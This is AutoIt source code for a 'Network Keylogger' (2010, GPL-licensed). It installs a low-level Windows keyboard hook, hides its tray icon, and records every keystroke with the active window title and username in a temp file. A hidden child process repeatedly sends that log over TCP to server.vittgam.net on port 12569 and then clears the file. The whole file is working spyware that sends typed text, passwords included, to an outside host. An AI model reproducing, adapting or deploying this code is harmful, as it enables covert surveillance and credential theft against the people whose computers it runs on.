#cs
	Network Keylogger - Sends every key pressed in a computer to another computer, via TCP/IP.
	Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net

	License information:

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
#ce

; Tested with AutoIt 3.3.6.0
#NoTrayIcon
#include <WinAPI.au3>
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=vittgam.ico
#AutoIt3Wrapper_outfile=network_keylogger.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0 by VittGam
#AutoIt3Wrapper_Res_Description=Network Keylogger
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.0
#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe
#AutoIt3Wrapper_Res_SaveSource=n
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#AutoIt3Wrapper_Au3Check_Parameters=-d -w 1 -w 2 -w 3 -w 4 -w 5 -w 6
#AutoIt3Wrapper_Au3Check_Stop_OnWarning=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

Global $server_addr="server.vittgam.net"
Global $server_port="12569"

Global $keylog_filename=@TempDir&"\tempbuffer-"&Random(1000000,9999999,1)&".txt"
Global $keys_01="{MOUSELEFT}"
Global $keys_02="{MOUSERIGHT}"
Global $keys_04="{MOUSEMIDDLE}"
Global $keys_05="{MOUSEX1}"
Global $keys_06="{MOUSEX2}"
Global $keys_08="{BACKSPACE}"
Global $keys_09="{TAB}"
Global $keys_0C="{CLEAR}"
Global $keys_0D="{ENTER}"
Global $keys_10="{SHIFT}"
Global $keys_11="{CTRL}"
Global $keys_12="{ALT}"
Global $keys_13="{PAUSE}"
Global $keys_14="{CAPSLOCK0}"
Global $keys_14_on="{CAPSLOCK1}"
Global $keys_1B="{ESC}"
Global $keys_20=" "
Global $keys_21="{PAGEUP}"
Global $keys_22="{PAGEDOWN}"
Global $keys_23="{END}"
Global $keys_24="{HOME}"
Global $keys_25="{LEFTARROW}"
Global $keys_26="{UPARROW}"
Global $keys_27="{RIGHTARROW}"
Global $keys_28="{DOWNARROW}"
Global $keys_29="{SELECT}"
Global $keys_2A="{PRINT}"
Global $keys_2B="{EXECUTE}"
Global $keys_2C="{PRINTSCREEN}"
Global $keys_2D="{INS}"
Global $keys_2E="{DEL}"
Global $keys_30="0"
Global $keys_31="1"
Global $keys_32="2"
Global $keys_33="3"
Global $keys_34="4"
Global $keys_35="5"
Global $keys_36="6"
Global $keys_37="7"
Global $keys_38="8"
Global $keys_39="9"
Global $keys_41="A"
Global $keys_42="B"
Global $keys_43="C"
Global $keys_44="D"
Global $keys_45="E"
Global $keys_46="F"
Global $keys_47="G"
Global $keys_48="H"
Global $keys_49="I"
Global $keys_4A="J"
Global $keys_4B="K"
Global $keys_4C="L"
Global $keys_4D="M"
Global $keys_4E="N"
Global $keys_4F="O"
Global $keys_50="P"
Global $keys_51="Q"
Global $keys_52="R"
Global $keys_53="S"
Global $keys_54="T"
Global $keys_55="U"
Global $keys_56="V"
Global $keys_57="W"
Global $keys_58="X"
Global $keys_59="Y"
Global $keys_5A="Z"
Global $keys_5B="{LEFTWIN1}"
Global $keys_5B_up="{LEFTWIN0}"
Global $keys_5C="{RIGHTWIN1}"
Global $keys_5C_up="{RIGHTWIN0}"
Global $keys_5D="{MENU1}"
Global $keys_5D_up="{MENU0}"
Global $keys_60="{0key}"
Global $keys_61="{1key}"
Global $keys_62="{2key}"
Global $keys_63="{3key}"
Global $keys_64="{4key}"
Global $keys_65="{5key}"
Global $keys_66="{6key}"
Global $keys_67="{7key}"
Global $keys_68="{8key}"
Global $keys_69="{9key}"
Global $keys_6A="{*key}"
Global $keys_6B="{+key}"
Global $keys_6C="{ENTERkey}"
Global $keys_6D="{-key}"
Global $keys_6E="{.key}"
Global $keys_6F="{/key}"
Global $keys_70="{F1}"
Global $keys_71="{F2}"
Global $keys_72="{F3}"
Global $keys_73="{F4}"
Global $keys_74="{F5}"
Global $keys_75="{F6}"
Global $keys_76="{F7}"
Global $keys_77="{F8}"
Global $keys_78="{F9}"
Global $keys_79="{F10}"
Global $keys_7A="{F11}"
Global $keys_7B="{F12}"
Global $keys_7C="{F13}"
Global $keys_7D="{F14}"
Global $keys_7E="{F15}"
Global $keys_7F="{F16}"
Global $keys_80="{F17}"
Global $keys_81="{F18}"
Global $keys_82="{F19}"
Global $keys_83="{F20}"
Global $keys_84="{F21}"
Global $keys_85="{F22}"
Global $keys_86="{F23}"
Global $keys_87="{F24}"
Global $keys_90="{NUMLOCK0}"
Global $keys_90_on="{NUMLOCK1}"
Global $keys_91="{SCROLLLOCK0}"
Global $keys_91_on="{SCROLLLOCK1}"
Global $keys_A0="{LSHIFT1}"
Global $keys_A0_up="{LSHIFT0}"
Global $keys_A1="{RSHIFT1}"
Global $keys_A1_up="{RSHIFT0}"
Global $keys_A2="{LCTRL1}"
Global $keys_A2_up="{LCTRL0}"
Global $keys_A3="{RCTRL1}"
Global $keys_A3_up="{RCTRL0}"
Global $keys_A4="{LALT1}"
Global $keys_A4_up="{LALT0}"
Global $keys_A5="{RALT1}"
Global $keys_A5_up="{RALT0}"
Global $keys_BA="è"
Global $keys_BB="+"
Global $keys_BC=","
Global $keys_BD="-"
Global $keys_BE="."
Global $keys_BF="ù"
Global $keys_C0="ò"
Global $keys_DB="'"
Global $keys_DC="\"
Global $keys_DD="ì"
Global $keys_DE="à"
Global $doing=0
Global $buffer=""
Global $connected=0
Global $socket=-1
Global $childpid=-1
If $CmdLine[0] = 2 Then
	If Execute("$CmdLine[1]") = "/child" And Execute("$CmdLine[2]") <> "" Then
		TCPStartup()
		OnAutoItExitRegister("Cleanup2")
		While 1
			$buffer=FileRead($keylog_filename)
			If $buffer <> "" Then
				If $connected Then
					TCPSend($socket,$buffer)
					If @error Then
						TCPCloseSocket($socket)
						$connected=0
					Else
						FileClose(FileOpen($keylog_filename,2))
					EndIf
				EndIf
				If Not $connected Then
					$socket=TCPConnect(TCPNameToIP($server_addr),$server_port)
					If $socket = -1 Then
						TCPCloseSocket($socket)
					Else
						$connected=1
						TCPSend($socket,$buffer)
						If @error Then
							TCPCloseSocket($socket)
							$connected=0
							Sleep(10000)
						Else
							FileClose(FileOpen($keylog_filename,2))
						EndIf
					EndIf
				EndIf
			EndIf
			If Not ProcessExists(Execute("$CmdLine[2]")) Then Exit
			Sleep(750)
		WEnd
	EndIf
	Exit
EndIf
Logger("Keylogger started")
Global $new=WinGetTitle("[active]")
Global $old=$new
Logger("Window title: """&$new&"""")
Global $hStub_KeyProc=DllCallbackRegister("_KeyProc","long","int;wparam;lparam")
Global $hmod=_WinAPI_GetModuleHandle(0)
Global $hHook=_WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL,DllCallbackGetPtr($hStub_KeyProc),$hmod)
OnAutoItExitRegister("Cleanup")
While 1
	If Not $doing Then
		$new=WinGetTitle("[active]")
		If $old <> $new Then
			Logger("Window title: """&$new&"""")
		EndIf
		$old=$new
	EndIf
	If Not ProcessExists($childpid) Then
		If @Compiled Then
			$childpid=Run('"'&@AutoItExe&'" /child '&@AutoItPID,@ScriptDir,@SW_HIDE)
		Else
			$childpid=Run('"'&@AutoItExe&'" "'&@ScriptFullPath&'" /child '&@AutoItPID,@ScriptDir,@SW_HIDE)
		EndIf
	EndIf
	Sleep(750)
WEnd
Func Logger($string1,$string2="")
	If $string1 <> "" Then $string2&=@CRLF&"["&$string1&", User: "&@UserName&", Time: "&@MDAY&"/"&@MON&"/"&@YEAR&" "&@HOUR&":"&@MIN&":"&@SEC&"]"&@CRLF
	If $string2 <> "" Then FileWrite($keylog_filename,$string2)
EndFunc
Func _KeyProc($nCode,$wParam,$lParam)
	Local $tKEYHOOKS=DllStructCreate("dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo",$lParam)
	If $nCode < 0 Then
		Return _WinAPI_CallNextHookEx($hHook,$nCode,$wParam,$lParam)
	EndIf
	Local $keycode=Hex(DllStructGetData($tKEYHOOKS,"vkCode"),2)
	Local $keyup=-1
	If $wParam = 0x0100 Then
		$keyup=0
	ElseIf BitAND(DllStructGetData($tKEYHOOKS,"flags"),$LLKHF_UP) = $LLKHF_UP Then
		$keyup=1
	ElseIf BitAND(DllStructGetData($tKEYHOOKS,"flags"),$LLKHF_ALTDOWN) = $LLKHF_ALTDOWN Then
		$keyup=0
	EndIf
	If $keyup <> -1 Then
		$doing=1
		$new=WinGetTitle("[active]")
		If $old <> $new Then
			Logger("Window title: """&$new&"""")
			Assign("keys_"&$keycode&"_used",0,2)
		EndIf
		$old=$new
		Local $tmp_text=Eval("keys_"&$keycode)
		If $keyup And (Eval("keys_"&$keycode&"_up") <> "") Then
			$tmp_text=Eval("keys_"&$keycode&"_up")
			Assign("keys_"&$keycode&"_used",0,2)
		EndIf
		If ($keycode = "90" Or $keycode = "91" Or $keycode = "14") Then
			Local $keystatus=DllCall("user32.dll","short","GetKeyState","int",Dec($keycode))
			If Not $keystatus[0] Then $tmp_text=Eval("keys_"&$keycode&"_on") ; "Not" because the key has already been pressed.
		EndIf
		If $tmp_text = "" Then $tmp_text="{!"&$keycode&"}"
		If Eval("keys_"&$keycode&"_used") <> 1 Then Logger("",$tmp_text)
		Assign("keys_"&$keycode&"_used",1,2)
		If $keyup Then Assign("keys_"&$keycode&"_used",0,2)
		$doing=0
	EndIf
	Return _WinAPI_CallNextHookEx($hHook,$nCode,$wParam,$lParam)
EndFunc
Func Cleanup()
	_WinAPI_UnhookWindowsHookEx($hHook)
	DllCallbackFree($hStub_KeyProc)
	Logger("Keylogger exited correctly")
	Exit
EndFunc
Func Cleanup2()
	TCPCloseSocket($socket)
	TCPShutdown()
	Exit
EndFunc
